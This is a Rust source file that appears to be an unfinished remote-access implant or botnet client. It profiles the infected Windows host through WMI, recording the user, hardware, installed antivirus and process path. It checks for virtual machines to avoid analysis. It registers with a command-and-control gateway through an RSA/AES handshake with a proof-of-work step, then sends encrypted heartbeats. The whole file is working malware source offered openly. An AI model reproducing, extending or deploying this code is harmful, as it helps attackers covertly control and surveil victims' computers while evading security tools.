extern crate colored; 

use std::{
    borrow::Borrow, fmt::format, fs::{self, File}, io::Write, net::IpAddr, path::Path, process::{exit, Command}, str, string, sync::{Arc, RwLock}, time::{SystemTime, UNIX_EPOCH}
};

use std::thread;
use std::time::Duration;

use std::env;
use std::process;
use rsa::{
    pkcs1::DecodeRsaPublicKey, 
    Pkcs1v15Encrypt, 
    RsaPublicKey
};

use base64::prelude::*;
use crypto::{ symmetriccipher, buffer, aes, blockmodes };
use crypto::buffer::{ ReadBuffer, WriteBuffer, BufferResult };

use colored::Colorize;
use lazy_static::lazy_static;
use crate::serde_json::json;
use serde_json;
use sha256;
use rand;
use std::io::prelude::*;

use wmi::*;
use std::collections::HashMap;
use wmi::Variant;

use argon2::{
    ParamsBuilder,
    password_hash::{
        PasswordHash, PasswordVerifier
    },
    Argon2
};

use itertools::Itertools;
use rand::RngCore;


const CONNECTION_INTERVAL: u64 = 300;
const ANTI_VIRTUAL: bool = false;
const GATEWAY_PATH: &str = "http://127.0.0.1:9999/gateway";
const SERVER_RSA_PUB: &str = "
-----BEGIN RSA PUBLIC KEY-----
MIIBCgKCAQEAx+zN1dr6iV1Upyd9ixoG2gxvupYqIeuFMV0GgWcCK91pcPZCkeQG
SDy/LhGjCjOMvX/2Eg0wsed99hntvZ2b6RKdsdfrSVUFxvp6H0lEVPGPjDCMssjY
RLi3JbKIopLtgdDHdnf4nCpnSrMNFV5ZuqdIoQIMaw/imyWATNSB18WOebAA8lI9
oR0XG89Ob3/IyxIAK1rUqlx1a1oJ+uBsLscsxwOGWyXir6by31uVfrdzxORFviCr
8bZfuX5wF06WQ9TH1WFAw/G4CTTWP5qooLug04Qt7cAemTLfJjkyaDeLq20ia2ix
xs9LxVype+cEoOSfpawaAH71Kw+d40Dp7wIDAQAB
-----END RSA PUBLIC KEY-----
";


// Main loop that handles sending a heartbeat and recieving connections to server is always running. 
// When the main loop recieves a task, it adds it to a global vec.
// Another loop in another thread will go through each item in the global vec, and complete the task.
// After the task is completed, it will send a "submit_output" request to the server.

fn parse_wmi(input: &Variant) -> String {
    let formatted = format!("{:?}", input);
    let start_index = formatted.find('(').unwrap_or(formatted.len());
    let end_index = formatted.rfind(')').unwrap_or(start_index);
    let extracted = &formatted[start_index + 1..end_index];
    extracted.replace("\\", "").replace("\"", "").into()
}

fn heartbeat_loop(client_id: String, encryption_key: String) {
    loop {
        let combined = format!("{}.{}", 
            client_id, 
            aes_256cbc_encrypt(&json!({
                "action": "heartbeat"
            }).to_string(), 
            encryption_key.as_bytes()).unwrap()
        );

        match ureq::post(GATEWAY_PATH).send_string(&combined) {
            Ok(result) => {
                fprint("success", &format!("Connection established with {}", GATEWAY_PATH.yellow()));
                result.into_string().unwrap()
            },
            Err(error) => {
                fprint("error", &format!("Unable to initialize handshake with server. Error: {}", error));
                exit(1);
            }
        };
        thread::sleep(Duration::from_millis(CONNECTION_INTERVAL * 1000));
    }
}

fn anti_virtualization() {

    use serde::Deserialize;  

    #[derive(Deserialize, Debug)]  
    pub struct Win32BIOS {  
        pub serialnumber: String,  
    }  

    let com_con = COMLibrary::new().unwrap();  
    let wmi_con = WMIConnection::new(com_con.into()).unwrap();  
    match wmi_con.raw_query::<Win32BIOS>("SELECT SerialNumber FROM Win32_BIOS") {
        Ok(results) => {
            if !results.is_empty() {  
                if results[0].serialnumber == 0.to_string() {
                    fprint("error", "Invalid bios serial detected");
                    terminate_and_block();
                }
            } else {  
                fprint("error", "Invalid bios serial detected");
                terminate_and_block();
            }  
        },
        Err(_) => {
            fprint("error", "Invalid bios serial detected");
            terminate_and_block();
        }
    };
  
}

fn init_connection() -> (String, String) {

    let wmi_con = WMIConnection::new(COMLibrary::new().unwrap()).unwrap();

    let proccess_id = process::id();
    let proccess_path = match env::current_exe() {
        Ok(result) => result.into_os_string().into_string().unwrap(),
        Err(error) => {
            fprint("error", &format!("Unable to fetch payload path. Error: {}", error));
            terminate_and_block();
            "N/A".to_string()
        }
    };

    let username = match env::var("username") {
        Ok(result) => result,
        Err(error) => {
            fprint("error", &format!("Unable to fetch username. Error: {}", error));
            terminate_and_block();
            exit(1);
        }
    };

    let gpu: String = match wmi_con.raw_query::<HashMap<String, Variant>>("SELECT name FROM Win32_VideoController") {
        Ok(results) => {
            results.iter().map(|os| 
                parse_wmi(&os["Name"])
            ).collect::<Vec<_>>().join("")
        }, 

        Err(error) => {
            fprint("error", &format!("Couldn't get GPU. Error: {:?} ", error));
            terminate_and_block();
            "N/A".to_string()
        }
    };
    
    let cpu: String = match wmi_con.raw_query::<HashMap<String, Variant>>("SELECT name FROM Win32_Processor") {
        Ok(results) => {
            results.iter().map(|os| 
                parse_wmi(&os["Name"])
            ).collect::<Vec<_>>().join("")
        }, 

        Err(error) => {
            fprint("error", &format!("Couldn't get CPU. Error: {:?} ", error));
            terminate_and_block();
            "N/A".to_string()
        }
    };

    let ram: u32 = match wmi_con.raw_query::<HashMap<String, Variant>>("SELECT TotalPhysicalMemory FROM Win32_ComputerSystem") {
        Ok(results) => {
            results.iter().map(|os| 
                parse_wmi(&os["TotalPhysicalMemory"])
            ).collect::<Vec<_>>().join("").parse::<u32>().unwrap()  / 1024 / 1024 / 1024
        }, 

        Err(error) => {
            fprint("error", &format!("Couldn't get RAM. Error: {:?} ", error));
            terminate_and_block();
            0
        }
    };

    let antivirus: String = match wmi_con.raw_query::<HashMap<String, Variant>>("SELECT displayName FROM AntiVirusProduct") {
        Ok(results) => {
            results.iter().map(|os|     
                parse_wmi(&os["displayName"])
            ).collect::<Vec<_>>().join("")
        }, 

        Err(error) => {
            fprint("error", &format!("Couldn't get AntiVirus. Error: {:?} ", error));
            terminate_and_block();
            "N/A".to_string()
        }
    };

    let client_bytes = random_bytes(32);
    let mut rng = rand::thread_rng();
    let server_pub_rsa = RsaPublicKey::from_pkcs1_pem(&SERVER_RSA_PUB).unwrap();
    let rsa_client_bytes = BASE64_STANDARD.encode(server_pub_rsa.encrypt(&mut rng, Pkcs1v15Encrypt, &client_bytes).unwrap());

    let server_response = match ureq::post(GATEWAY_PATH).send_string(&rsa_client_bytes) {
        Ok(result) => {
            fprint("success", &format!("Connection established with {}", GATEWAY_PATH.yellow()));
            result.into_string().unwrap()
        },
        Err(error) => {
            fprint("error", &format!("Unable to initialize handshake with server. Error: {}", error));
            exit(1);
        }
    };

    let raw_server_json: Vec<u8> = match aes_256cbc_decrypt(&server_response, &client_bytes) {
        Ok(result) => result,
        Err(error) => {
            fprint("error", &format!("Server response not encrypted properly. Response: {} | Error: {:?}", &server_response, error));
            exit(1);
        }
    };

    let parsed_server_json = match serde_json::from_slice::<serde_json::Value>(&raw_server_json) {
        Ok(result) => result,
        Err(error) => {
            fprint("error", &format!("Couldn't convert server raw json into parsed json. Json: {:?} | Error: {:?}", &raw_server_json, &error));
            exit(1);
        }
    };

    fprint("task", &format!("Cracking {}", &parsed_server_json["hash"]));

    let start_time = get_timestamp();
    let server_seed = BASE64_STANDARD.decode(key_to_string(&parsed_server_json, "seed")).unwrap();
    let server_hash = key_to_string(&parsed_server_json, "hash");
    let mut server_bytes: Vec<u8> = vec![];

    for perm in server_seed.iter().permutations(server_seed.len()).unique() {
        let mut temp = vec![];
        for byte in perm { temp.push(*byte); }

        if verify_argon2(&server_hash, &temp) {
            server_bytes = temp;
            break;
        }
    }      

    let encryption_key =  sha256::digest([client_bytes.clone(), server_bytes.clone()].concat())[..32].to_string();

    fprint("success", &format!("Generated encryption key in {}s: {}", {
        get_timestamp() - start_time
    }, encryption_key.yellow()));


    let rsaed_encryption_key = BASE64_STANDARD.encode(server_pub_rsa.encrypt(&mut rng, Pkcs1v15Encrypt, &encryption_key.as_bytes()).unwrap());
    let registration_payload = aes_256cbc_encrypt(&json!({
        "version": 10,
        "uac": false,
        "username": username,
        "guid": "windows_guid", // WMI
        "cpu": cpu,
        "gpu": gpu,
        "ram": ram,
        "antivirus": antivirus,
        "path": proccess_path,
        "pid": proccess_id,
    }).to_string(), encryption_key.as_bytes()).unwrap();

    let combined = format!("{}.{}", rsaed_encryption_key, registration_payload);
    let registration_response = match ureq::post(GATEWAY_PATH).send_string(&combined) {
        Ok(result) => {
            result.into_string().unwrap()
        },
        Err(error) => {
            fprint("error", &format!("Unable to submit registration. Error: {}", error));
            exit(1);
        }
    };

    let client_id = match aes_256cbc_decrypt(&registration_response, encryption_key.as_bytes()) {
        Ok(result) => String::from_utf8(result).unwrap(),
        Err(error) => {
            fprint("error", &format!("Unable to decrypt registration response. Error: {:?} | Raw Response: {}", error, registration_response));
            exit(1);
        }
    };

    fprint("info", &format!("Obtained client id {}", &client_id.yellow()));
    return (client_id, encryption_key);

}

fn terminate_and_block() {
    if !ANTI_VIRTUAL {return}
    drop(ureq::get(GATEWAY_PATH).call());
    exit(1);
}

fn main() {
    colored::control::set_virtual_terminal(true).unwrap();
    anti_virtualization();

    let (client_id, encryption_key) = init_connection();
    let handle = thread::spawn(move || {
        heartbeat_loop(client_id, encryption_key) // Use global rwlock here later
    });
    handle.join().unwrap();

    // If the main heartbeat loop encounters a task, add it to a global vec. Another thread will complete that task and submit the output, and remove it from the global vec.
    // The main heartbeat loop doesn't ever read this vec, so a rece condition will never occur.

    // REFACTOR CODE. IT IS UGLY AS SHIT RIGHT NOW.
}

fn get_timestamp() -> u64 {
    let since_the_epoch = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .expect("Time went backwards lmao");
    return since_the_epoch.as_secs()
}


// TODO :BUFFER TOO SMALL

fn aes_256cbc_encrypt(data: &str, key: &[u8]) -> core::result::Result<String, symmetriccipher::SymmetricCipherError> {

    let mut encryptor = aes::cbc_encryptor(
            aes::KeySize::KeySize256,
            key,
            &key[..16],
            blockmodes::PkcsPadding);
   
    let mut final_result = Vec::<u8>::new();
    let mut read_buffer = buffer::RefReadBuffer::new(data.as_bytes());
    let mut buffer = [0; 4096];
    let mut write_buffer = buffer::RefWriteBuffer::new(&mut buffer);

    loop {
        let result = encryptor.encrypt(&mut read_buffer, &mut write_buffer, true)?;

        final_result.extend(write_buffer.take_read_buffer().take_remaining().iter().map(|&i| i));

        match result {
            BufferResult::BufferUnderflow => break,
            BufferResult::BufferOverflow => { }
        }
    }

    Ok(BASE64_STANDARD.encode(final_result))
}

fn aes_256cbc_decrypt(encrypted_data: &str, key: &[u8]) -> core::result::Result<Vec<u8>, symmetriccipher::SymmetricCipherError> {

    let encrypted_data = BASE64_STANDARD.decode(encrypted_data).unwrap();
    let mut decryptor = aes::cbc_decryptor(
            aes::KeySize::KeySize256,
            key,
            &key[..16],
            blockmodes::PkcsPadding);

    let mut final_result = Vec::<u8>::new();
    let mut read_buffer = buffer::RefReadBuffer::new(encrypted_data.as_slice());
    let mut buffer = [0; 4096];
    let mut write_buffer = buffer::RefWriteBuffer::new(&mut buffer);

    loop {
        let result = decryptor.decrypt(&mut read_buffer, &mut write_buffer, true)?;
        final_result.extend(write_buffer.take_read_buffer().take_remaining().iter().map(|&i| i));
        match result {
            BufferResult::BufferUnderflow => break,
            BufferResult::BufferOverflow => { }
        }
    }

    Ok(final_result)
}

fn fprint(stype: &str, sformatted: &str) -> () {
    
    let color = match stype {
        "info" => stype.to_uppercase().cyan(),
        "error" => stype.to_uppercase().red(),
        "failure" => stype.to_uppercase().red(),
        "restricted" => stype.to_uppercase().red(),
        "success" => stype.to_uppercase().green(),
        "task" => stype.to_uppercase().yellow(),
        _ => stype.to_uppercase().white(),
    };


    println!("[{} - {}] {}", get_timestamp().to_string().white(), color, sformatted);
}

fn key_to_string(json: &serde_json::Value, json_key: &str) -> String {String::from(json[json_key].as_str().unwrap())}
fn key_to_u64(json: &serde_json::Value, json_key: &str) -> u64 {json[json_key].as_u64().unwrap()}
fn key_to_bool(json: &serde_json::Value, json_key: &str) -> bool {json[json_key].as_bool().unwrap()}
fn key_exists(json: &serde_json::Value, json_key:&str) -> bool {if let Some(_) = json.get(json_key) {return true} else {return false}}

fn verify_argon2(hash: &str, input: &[u8]) -> bool {

     let params = 
        ParamsBuilder::new()
        .m_cost(2_u32.pow(8))
        .t_cost(16)
        .p_cost(2)
        .build()
        .unwrap();

    let argon2 = Argon2::new(argon2::Algorithm::Argon2id, argon2::Version::V0x13, params);
    return argon2.verify_password(
        input, &PasswordHash::parse(&hash, argon2::password_hash::Encoding::B64
    ).unwrap()).is_ok();
}

pub fn random_bytes(len: usize) -> Vec<u8> {
    let mut buffer = vec![0; len];
    rand::thread_rng().fill_bytes(&mut buffer);
    buffer[..].to_vec()
}